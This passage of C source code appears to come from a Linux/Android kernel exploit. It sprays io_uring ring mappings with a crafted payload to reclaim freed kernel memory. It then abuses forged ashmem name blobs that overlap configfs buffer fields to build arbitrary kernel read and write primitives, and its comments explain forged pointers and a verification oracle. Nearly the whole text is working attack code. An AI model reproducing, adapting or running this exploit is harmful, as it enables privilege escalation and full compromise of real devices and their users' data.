  }
  controlled_uring_prewarm_count = 0;
}

static int controlled_uring_spray_one(unsigned entries) {
  if (controlled_uring_hold_count >= CONTROLLED_URING_MAX)
    return 0;

  struct uring_params p;
  memset(&p, 0, sizeof(p));
  int fd = (int)syscall(__NR_io_uring_setup, entries, &p);
  if (fd < 0) {
    pr_warning("controlled spectrum setup entries=%u errno=%d\n",
               entries, errno);
    return 0;
  }

  size_t sq_ring_used = p.sq_off.array +
                        (size_t)p.sq_entries * sizeof(uint32_t);
  size_t cq_ring_used = p.cq_off.cqes +
                        (size_t)p.cq_entries * sizeof(struct uring_cqe);
  size_t rings_used = sq_ring_used > cq_ring_used ?
                      sq_ring_used : cq_ring_used;
  size_t sqes_used = (size_t)p.sq_entries * sizeof(struct uring_sqe);
  size_t rings_size = controlled_uring_alloc_size(rings_used);
  size_t sqes_size = controlled_uring_alloc_size(sqes_used);

  void *rings = mmap(NULL, rings_size, PROT_READ | PROT_WRITE,
                     MAP_SHARED | MAP_POPULATE, fd, URING_OFF_SQ_RING);
  void *sqes = mmap(NULL, sqes_size, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_POPULATE, fd, URING_OFF_SQES);
  if (rings == MAP_FAILED || sqes == MAP_FAILED) {
    int saved = errno;
    if (rings != MAP_FAILED)
      munmap(rings, rings_size);
    if (sqes != MAP_FAILED)
      munmap(sqes, sqes_size);
    close(fd);
    errno = saved;
    pr_warning("controlled spectrum mmap entries=%u rings=%zu sqes=%zu errno=%d\n",
               entries, rings_size, sqes_size, errno);
    return 0;
  }

  size_t payload_off = (size_t)(-SKB_DATA_DELTA);
  if (payload_off + ORDER3_SIZE > SKB_SEND_SIZE) {
    munmap(rings, rings_size);
    munmap(sqes, sqes_size);
    close(fd);
    return 0;
  }
  const unsigned char *page_payload = skb_buf + payload_off;
  for (size_t off = 0; off + ORDER3_SIZE <= rings_size;
       off += ORDER3_SIZE)
    memcpy((unsigned char *)rings + off, page_payload, ORDER3_SIZE);
  for (size_t off = 0; off + ORDER3_SIZE <= sqes_size;
       off += ORDER3_SIZE)
    memcpy((unsigned char *)sqes + off, page_payload, ORDER3_SIZE);

  struct controlled_uring_hold *hold =
      &controlled_uring_holds[controlled_uring_hold_count++];
  hold->fd = fd;
  hold->rings = rings;
  hold->rings_size = rings_size;
  hold->sqes = sqes;
  hold->sqes_size = sqes_size;
  pr_info("controlled spectrum entries=%u ring_order=%zu sqe_order=%zu\n",
          entries, rings_size / PAGE_SIZE, sqes_size / PAGE_SIZE);
  return 1;
}

static int controlled_spectrum_reclaim(void) {
  static const unsigned entries[] = {
    512, 1024, 2048, 4096, 8192, 16384, 32768,
  };
  int sprayed = 0;
  for (size_t i = 0; i < sizeof(entries) / sizeof(entries[0]); i++)
    sprayed += controlled_uring_spray_one(entries[i]);
  pr_info("controlled spectrum total=%d\n", sprayed);
  return sprayed;
}

static ssize_t uring_rw(int target_fd, int op, void *buf, size_t count, off_t offset) {
  struct uring_params p;
  memset(&p, 0, sizeof(p));

  int ring_fd = (int)syscall(__NR_io_uring_setup, 1, &p);
  if (ring_fd < 0) {
    pr_warning("uring setup failed errno=%d\n", errno);
    return -1;
  }

  size_t sq_sz = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
  size_t cq_sz = p.cq_off.cqes + p.cq_entries * sizeof(struct uring_cqe);

  void *sq_ptr = mmap(NULL, sq_sz, PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_POPULATE, ring_fd, URING_OFF_SQ_RING);
  void *cq_ptr = mmap(NULL, cq_sz, PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_POPULATE, ring_fd, URING_OFF_CQ_RING);
  struct uring_sqe *sqes = mmap(NULL, p.sq_entries * sizeof(struct uring_sqe),
                                PROT_READ | PROT_WRITE,
                                MAP_SHARED | MAP_POPULATE, ring_fd, URING_OFF_SQES);

  if (sq_ptr == MAP_FAILED || cq_ptr == MAP_FAILED || sqes == MAP_FAILED) {
    pr_warning("uring mmap failed sq=%p cq=%p sqes=%p errno=%d\n",
               sq_ptr, cq_ptr, (void *)sqes, errno);
    close(ring_fd);
    return -1;
  }

  uint32_t *sq_tail = (uint32_t *)((char *)sq_ptr + p.sq_off.tail);
  uint32_t *sq_array = (uint32_t *)((char *)sq_ptr + p.sq_off.array);
  uint32_t *cq_head = (uint32_t *)((char *)cq_ptr + p.cq_off.head);
  uint32_t *cq_tail_p = (uint32_t *)((char *)cq_ptr + p.cq_off.tail);
  struct uring_cqe *cqes_p = (struct uring_cqe *)((char *)cq_ptr + p.cq_off.cqes);
  uint32_t mask = *(uint32_t *)((char *)sq_ptr + p.sq_off.ring_mask);
  uint32_t cq_mask = *(uint32_t *)((char *)cq_ptr + p.cq_off.ring_mask);

  struct iovec iov;
  iov.iov_base = buf;
  iov.iov_len = count;

  uint32_t tail = *sq_tail;
  uint32_t idx = tail & mask;
  memset(&sqes[idx], 0, sizeof(sqes[idx]));
  sqes[idx].opcode = op;
  sqes[idx].fd = target_fd;
  sqes[idx].addr = (uint64_t)(uintptr_t)&iov;
  sqes[idx].len = 1;
  sqes[idx].off = (uint64_t)offset;
  sqes[idx].user_data = 0x4343;
  sq_array[idx] = idx;
  __atomic_store_n(sq_tail, tail + 1, __ATOMIC_RELEASE);

  long ret = syscall(__NR_io_uring_enter, ring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0);

  ssize_t result = -1;
  if (ret < 0) {
    pr_warning("uring enter failed errno=%d\n", errno);
  } else {
    uint32_t ch = __atomic_load_n(cq_head, __ATOMIC_ACQUIRE);
    uint32_t ct = __atomic_load_n(cq_tail_p, __ATOMIC_ACQUIRE);
    if (ct != ch) {
      struct uring_cqe *cqe = &cqes_p[ch & cq_mask];
      result = cqe->res;
      pr_info("uring cqe op=%d fd=%d res=%d\n", op, target_fd, cqe->res);
      __atomic_store_n(cq_head, ch + 1, __ATOMIC_RELEASE);
    } else {
      pr_warning("uring no cqe\n");
    }
  }

  munmap(sqes, p.sq_entries * sizeof(struct uring_sqe));
  munmap(cq_ptr, cq_sz);
  munmap(sq_ptr, sq_sz);
  close(ring_fd);

  if (result < 0) {
    errno = (int)(-result);
    return -1;
  }
  return result;
}

static ssize_t uring_pwrite(int fd, const void *buf, size_t count, off_t offset) {
  return uring_rw(fd, IORING_OP_WRITEV, (void *)buf, count, offset);
}

static ssize_t uring_pread(int fd, void *buf, size_t count, off_t offset) {
  return uring_rw(fd, IORING_OP_READV, buf, count, offset);
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, 0);
  return wr;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  (void)fd;
  int read_fd = open(ashmem_path, O_RDWR | O_CLOEXEC);
  if (read_fd < 0)
    return -1;

  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  /* Keep the user-controlled part of ashmem's name non-empty through the
   * five bytes preceding buffer->page. This lets ASHMEM_GET_NAME return the
   * forged pointer for verification instead of substituting "dev/ashmem"
   * at the first NUL. These bytes are only padding in the configfs view. */
  memset(blob, 1, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN);
  /* configfs_read_file with needs_read_fill=0 never touches configfs inode
   * metadata; it directly calls simple_read_from_buffer(page, count).
   * Use a fresh ashmem file and plain read(): file->f_pos is then guaranteed
   * to start at zero. This vendor's pread64 path delivered a corrupted
   * loff_t to the forged callback even when userspace passed offset zero. */
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(read_fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    close(read_fd);
    errno = set_errno;
    return -1;
  }

  /* ASHMEM_GET_NAME is only a useful verification oracle when the pointer
   * has no embedded NUL: get_name() copies a C string and cannot return the
   * bytes after a zero (page-aligned kernel addresses normally start with
   * two). try_set_ashmem_name_blob still reconstructs those zeros in the
   * kernel object via descending-prefix writes. */
  int target_has_zero = 0;
  for (size_t i = 0; i < sizeof(target); i++) {
    if (((target >> (i * 8)) & 0xff) == 0) {
      target_has_zero = 1;
      break;
    }
  }
  if (!target_has_zero) {
    char name_check[ASHMEM_NAME_LEN];
    memset(name_check, 0, sizeof(name_check));
    if (ioctl(read_fd, ASHMEM_GET_NAME, name_check) != 0) {
      int saved = errno;
      close(read_fd);
      errno = saved;
      return -1;
    }
    uintptr_t page_check = 0;
    memcpy(&page_check, name_check +
           (CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN), sizeof(page_check));
    if (page_check != target) {
      pr_warning("configfs read state mismatch target=%016zx page=%016zx\n",
                 target, page_check);
      close(read_fd);
      errno = EFAULT;
      return -1;
    }
  }

  errno = 0;
  ssize_t ret = read(read_fd, data, len);
  int saved = errno;
  close(read_fd);
  errno = saved;
  return ret;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}
